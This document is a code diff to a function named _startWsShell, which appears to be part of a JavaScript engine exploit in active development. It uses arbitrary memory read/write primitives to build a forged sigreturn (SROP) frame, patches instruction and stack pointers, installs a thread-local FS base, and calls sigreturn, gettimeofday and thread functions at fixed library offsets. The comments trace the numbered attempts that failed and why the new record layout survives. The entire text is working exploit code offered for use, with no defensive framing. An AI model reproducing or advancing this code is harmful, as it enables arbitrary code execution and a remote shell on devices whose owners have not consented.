@@ -5482,40 +5482,37 @@ function _startWsShell(){
           reply.retSlot={addr:'0x'+retSlotAddr.toString(16),provenance:'V70 constant cfr-0x328 across four boots'};
           SF('2 direct retSlot=0x'+retSlotAddr.toString(16)+' (cfr-0x328)');
 
-          /* (2) THE PARENT RECORD AT B2 (srop23 - THE +0x20 SCOPE FIELD
-           * FIX). srop22's rehearsal died again: the ONLY difference vs the
-           * proven-survivable rawcall = the mask-zero loop zeroed B2+0x08,
-           * 0x10, 0x18 AND 0x20 - the rawcall zeroes only through +0x20 and
-           * survives, so THE +0x20 QWORD IS A THIRD LIVE-CRITICAL SCOPE
-           * FIELD (after the side-channel and the VM pair). THE FIX: the B2
-           * clone is UNTOUCHED - all 0x48 live bytes stay. The kernel reads
-           * the signal mask from the record's +0x08-0x28 = the clone's live
-           * bytes: any 128-bit mask is valid input, and a fault-generated
-           * SIGSEGV is delivered regardless of the mask, so a garbage mask
-           * is safe. The record's fields: +0x48..0x4C0 (the 814a constants
-           * + the discovered FS base) + the mode patches. */
-          var CTX=CAP+0x1000n,STK=CAP+0x2F00n,WIT=CAP+0x3000n,B2=CAP+0x2000n;
+          /* (2) THE PARENT RECORD AT R (srop24 = THE FIRE-SHAPE RECORD + THE
+           * FS BASE). THE EMPIRICAL TRIANGLE: the fire-era ctxF (MBUF+0x1000:
+           * 0xA0 qwords zeroed + vm38/vm40 copied + the gates) SURVIVED
+           * 417/thr_create calls with RDI=ctxF; the fake scope as built
+           * (zeros + VM) survived the E2; our 814a-constant records DIED on
+           * the first scope call wherever they lived (srop12-19 at CAP,
+           * srop21-23 at B2). THE CALL PATH TOLERATES THE FIRE SHAPE AND
+           * DIES ON THE 814a SHAPE. srop24 = the fire's exact shape + the
+           * two real fixes: the discovered FS base at +0x480, and the
+           * identified RIP/RSP/args patches. MBUF = fakeScope-0x80. */
+          var CTX=CAP+0x1000n,STK=CAP+0x2F00n,WIT=CAP+0x3000n;
+          var R=CAP-0x80n+0x1000n;   /* MBUF+0x1000 = the fire's proven region */
           for(var zS=0;zS<0x500/8;zS++)S.absWrite(CTX+BigInt(zS*8),0n);
           S.absWrite(WIT,0n);
           S.absWrite(STK,lkS+0x13EC0n);
           reply.vm38='0x'+S.absRead(S.fakeScope+0x38n,8)[0].toString(16);
-          var headS=S.absRead(CAP,0x48);
-          for(var hW=0;hW<headS.length;hW++)S.absWrite(B2+BigInt(hW*8),headS[hW]);
-          var K814={72:0n,80:0n,88:0n,96:0n,104:0n,112:0n,120:0n,
-                   128:0x2FECE976n,136:cfrS,144:0x515CA11n,152:0x4B1AA0n,
-                   160:0xFFFFFFFFn,176:0x2FD98042n,184:0x2FD98042n,
-                   192:0x1B001300000000n,208:0x3B003B00000001n,
-                   232:0x43n,240:0x202n,256:0x3Bn,
-                   264:0x480n,272:0x10002n,280:0x20001n,
-                   320:0x20037Fn,344:0x2FFFF00009FE5n,
-                   352:0xFFFFn,376:0xFFFFn,400:0xFFFFn,408:0xFFFFn,424:0xFFFFn,
-                   464:0x8180000000000000n,472:0x4007n,
-                   560:0x3FF0000000000000n,624:0xFFFFFFFFFFFFFFFFn,632:0xFFFFFFFFFFFFFFFFn,
-                   832:0x7n,1152:fsB,1160:0n};
-          for(var rW=0x48;rW<0x4C0;rW+=8){
-            S.absWrite(B2+BigInt(rW),(K814[rW]!==undefined)?K814[rW]:0n);
-          }
-          reply.recordReplicated=true;
+          for(var zR=0;zR<0xA0;zR++)S.absWrite(R+BigInt(zR*8),0n);   /* the fire's exact zeroing */
+          S.absWrite(R+0x38n,S.absRead(CAP+0x38n,8)[0]);             /* vm38 = the calibrated VM */
+          S.absWrite(R+0x40n,S.absRead(CAP+0x40n,8)[0]);             /* vm40 = the neighbor */
+          /* the fire's gate set + the new fixes: */
+          S.absWrite(R+0x0C0n,0x43n);
+          S.absWrite(R+0x0D0n,0n);             /* mc_flags=0 = the 814b shape: no FP restore */
+          S.absWrite(R+0x0E8n,0x43n);
+          S.absWrite(R+0x0F0n,0x202n);
+          S.absWrite(R+0x100n,0x3Bn);
+          S.absWrite(R+0x108n,0x480n);
+          S.absWrite(R+0x110n,0x10002n);
+          S.absWrite(R+0x118n,0x20001n);
+          S.absWrite(R+0x480n,fsB);            /* THE FS BASE FIX */
+          S.absWrite(R+0x488n,0n);
+          reply.recordFireShape=true;
           /* the child starts at the identified Thrd_exit import. Only the
            * proven manual gates are used; parent TLS/stack state is not copied. */
           S.absWrite(CTX+0x048n,0n);
@@ -5541,43 +5538,43 @@ function _startWsShell(){
           }
           var isRT=(msg.mode==='rt');
 
-          /* (3) THE MODE PATCHES on the record at B2. mode=ic = the
+          /* (3) THE MODE PATCHES on the record at R. mode=ic = the
            * INSTALL-CONTROL: a harmless gettimeofday through the SAME call
-           * site with RDI=B2 (its push writes the return address; its ret
+           * site with RDI=R (its push writes the return address; its ret
            * pops but LEAVES the value), then RIP = that value and RSP =
            * cfr-0x320 - the iretq resumes the trampoline exactly as a
            * normal callee return, no target runs. SURVIVES = the install
            * proven; DIES = the install itself. rt/real = the target modes
-           * (the rt's tv lands at B2+0x800, beyond the record). */
+           * (the rt's tv lands at R+0x800, beyond the fire's zeroing). */
           var isIC=(msg.mode==='ic');
           if(isIC){
-            SF_CALL(lkS+0xB50n,B2);
+            SF_CALL(lkS+0xB50n,R);
             var retv=S.absRead(retSlotAddr,8)[0];
             reply.icRet='0x'+retv.toString(16);
             if(!(retv>=0x800000000n&&retv<0x1000000000n)){
               reply.err='retSlot still not a code return after the rehearsal';break;
             }
-            S.absWrite(B2+0x0E0n,retv);
-            S.absWrite(B2+0x0F8n,retSlotAddr+0x8n);
-            S.absWrite(B2+0x048n,0n);
-            S.absWrite(B2+0x050n,0n);
+            S.absWrite(R+0x0E0n,retv);
+            S.absWrite(R+0x0F8n,retSlotAddr+0x8n);
+            S.absWrite(R+0x048n,0n);
+            S.absWrite(R+0x050n,0n);
             SF('3 INSTALL-CONTROL RIP=[retSlot post-rehearsal] RSP=cfr-0x320 (no target)');
           }else if(msg.mode==='rt'){
-            S.absWrite(B2+0x048n,B2+0x800n);   /* the tv buffer = beyond the record */
-            S.absWrite(B2+0x050n,0n);          /* tz = NULL */
-            S.absWrite(B2+0x0E0n,lkS+0xB50n);
+            S.absWrite(R+0x048n,R+0x800n);     /* the tv buffer = beyond the fire's zeroing */
+            S.absWrite(R+0x050n,0n);           /* tz = NULL */
+            S.absWrite(R+0x0E0n,lkS+0xB50n);
             SF('3 ROUNDTRIP target=gettimeofday (no thr_create)');
           }else{
-            S.absWrite(B2+0x048n,CTX);
-            S.absWrite(B2+0x050n,WIT);
-            S.absWrite(B2+0x0E0n,lkS+0x13D20n);
+            S.absWrite(R+0x048n,CTX);
+            S.absWrite(R+0x050n,WIT);
+            S.absWrite(R+0x0E0n,lkS+0x13D20n);
             SF('3 child RIP=thr_exit parent=(RDI=ctx,RSI=wit,RDX=0) fsbase installed');
           }
-          S.absWrite(B2+0x058n,0n);
-          S.absWrite(B2+0x0F8n,retSlotAddr);
+          S.absWrite(R+0x058n,0n);
+          S.absWrite(R+0x0F8n,retSlotAddr);
 
-          /* (4) THE INSTALL: sigreturn reads the record at RDI=B2. */
-          var origSr=SF_CALL(lkS+0x13ED0n,B2);
+          /* (4) THE INSTALL: sigreturn reads the record at RDI=R. */
+          var origSr=SF_CALL(lkS+0x13ED0n,R);
           reply.sigreturnRestored=(S.absRead(S.neEntry.addr+0x28n,8)[0]===origSr);
           if(isIC){
             SF('4 INSTALL-CONTROL SURVIVED - the install is PROVEN');
@@ -5585,7 +5582,7 @@ function _startWsShell(){
             break;
           }
           if(isRT){
-            var tvSec=S.absRead(B2+0x800n,8)[0],tvUsec=S.absRead(B2+0x808n,8)[0];
+            var tvSec=S.absRead(R+0x800n,8)[0],tvUsec=S.absRead(R+0x808n,8)[0];
             reply.roundtrip={sec:'0x'+tvSec.toString(16),usec:'0x'+tvUsec.toString(16),
                              valid:(tvSec>0x40000000n&&tvSec<0x80000000n&&tvUsec<0xF4240n)};
             SF('4 ROUNDTRIP parent ALIVE sec=0x'+tvSec.toString(16)+' usec=0x'+tvUsec.toString(16));
